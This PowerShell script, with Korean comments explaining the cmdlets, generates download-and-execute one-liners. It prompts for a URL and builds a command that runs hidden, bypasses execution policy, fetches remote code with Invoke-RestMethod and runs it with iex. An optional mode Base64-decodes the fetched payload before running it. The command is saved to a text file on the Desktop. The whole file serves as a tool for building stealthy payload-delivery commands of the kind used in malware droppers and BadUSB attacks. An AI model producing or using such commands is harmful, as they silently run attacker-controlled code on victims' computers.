# Read-Host : 사용자의 입력을 받는다.
# [string]::IsNullOrWhiteSpace() 
# 1. [string] == [System.String]의 축약형
# 2. [Sysytem.String]::IsNullOrWhiteSpace()로 사용해도 된다.
# Write-Host : 사용자에게 해당 내용을 출력한다.
# [System.Environment]::GetFolderPath : 폴더의 위치를 구해온다.
# Join-Path : 각각의 위치를 이어 붙인다.
# Out-File : 파일에 입력값을 출력한다.
# Invoke-RestMethod : URL에서 값을 받아온다.

function Create-irm {
    # Prompt user for choice
    $choice = Read-Host "Do you want to do Basic or BASE64 + M.E.? (Enter 'Basic' or 'BASE64')"

    if ($choice -eq 'Basic' -or $choice -eq 'BASE64') {

		# Ask for script name
        $scriptName = Read-Host "Enter the script name (without extension)"

        # Ask for irm link
        $link = Read-Host "Enter the irm link"

        # Remove "https://" from the link
        $link = $link -replace '^https://', ''

        # Check if $scriptName is blank, and construct the command accordingly
        if ([string]::IsNullOrWhiteSpace($scriptName)) {
            $scriptName = "IRM_Command"
        }

        if ($choice -eq 'Basic') {
            # Ask for function name for iex (allow blank input)
            $functionName = Read-Host "Enter the function name for iex (leave blank if none)"

            # Check if $functionName is blank, and construct the command accordingly
            if ([string]::IsNullOrWhiteSpace($functionName)) {
                $command = "powershell -w h -NoP -Ep Bypass irm $link|iex"
            } else {
                $command = "powershell -w h -NoP -Ep Bypass irm $link|iex;$functionName"
            }
        } elseif ($choice -eq 'BASE64') {
            # Form the command
            $command = @"
powershell -NoP -W H -Ep Bypass iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm $link))))
"@
        }

        # Display the command to the user
        Write-Host "Generated Command:" -ForegroundColor Cyan
        Write-Host $command -ForegroundColor Green

        # Save the command to a .txt file on the desktop
        $desktopPath = [System.Environment]::GetFolderPath('Desktop')
        $txtFilePath = Join-Path -Path $desktopPath -ChildPath "$scriptName.txt"
        $command | Out-File -FilePath $txtFilePath -Encoding UTF8

        Write-Host "Command saved to $txtFilePath" -ForegroundColor Yellow
    } else {
        Write-Host "Invalid choice. Exiting..." -ForegroundColor Red
        return
    }
}

# Call the function
#Create-irm
